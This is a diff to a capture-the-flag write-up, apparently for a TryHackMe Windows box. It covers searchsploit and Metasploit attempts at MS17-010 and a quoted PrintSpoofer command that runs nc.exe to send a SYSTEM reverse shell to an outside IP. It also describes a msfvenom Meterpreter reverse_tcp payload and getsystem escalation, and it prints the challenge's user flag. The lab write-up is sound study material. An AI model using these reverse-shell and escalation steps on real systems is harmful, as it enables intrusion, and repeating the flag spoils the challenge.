@@ -248,9 +248,10 @@ Microsoft Windows 8/8.1/2012 R2 (x64) - 'E | windows_x86-64/remote/42030.py
 Microsoft Windows Server 2008 R2 (x64) - ' | windows_x86-64/remote/41987.py
 ------------------------------------------- ---------------------------------
 Shellcodes: No Results
-
 ```
+
 The last one is closest match 41987.py, tested and fails for unknown reason also ms17_010 metasploit exploit failed just states 
+
 ms17_010 not vulnerable:
 ```
 msf > use exploit/windows/smb/ms17_010_eternalblue
@@ -307,7 +308,7 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
-Answer Q1: User flag is THM{fdk4ka34vk346ksxfr21tg789ktf45}
+Answer Q1: User flag is THM{fdk4ka34vk346ksxfr21tg789ktf45}, from simple directory traversal.
 
 From whoami /priv it appears the SeImpersonatePrivilege is enabled and is useful for excalation:
 
@@ -335,41 +336,26 @@ Examples:
   - Get a SYSTEM reverse shell
       PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
 
+The other option using metasploit, start a exploit/multi/handler to listen for meterpreter, upload a exploit using a msfvenom exploit with payload windows/x64/meterpreter/reverse_tcp, then run the exploit in browser from the folder on port 49663 connection.
 
-
-Meterpreter results
+Meterpreter results:
 ```
 meterpreter > shell
-Process 972 created.
-Channel 1 created.
-Microsoft Windows [Version 10.0.14393]
-(c) 2016 Microsoft Corporation. All rights reserved.
-
+...
 c:\windows\system32\inetsrv>cd /users/Bob/Desktop
-
 c:\Users\Bob\Desktop>type user.txt
 THM{fdk4ka34vk346ksxfr21tg789ktf45}
 c:\Users\Bob\Desktop>exit
-
-#ESCALATE
-
+```
+# ESCALATE
+```
 meterpreter > getsystem
 ...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
-meterpreter > whoami
-[-] Unknown command: whoami. Run the help command for more details.
 meterpreter > shell
-Process 3532 created.
-Channel 2 created.
-Microsoft Windows [Version 10.0.14393]
-(c) 2016 Microsoft Corporation. All rights reserved.
-
+...
 c:\windows\system32\inetsrv>cd /users/Administrator/Desktop
-
 c:\Users\Administrator\Desktop>dir
-
- Volume in drive C has no label.
- Volume Serial Number is AC3C-5CB5
-
+...
  Directory of c:\Users\Administrator\Desktop
 
 07/25/2020  08:24 AM    <DIR>          .
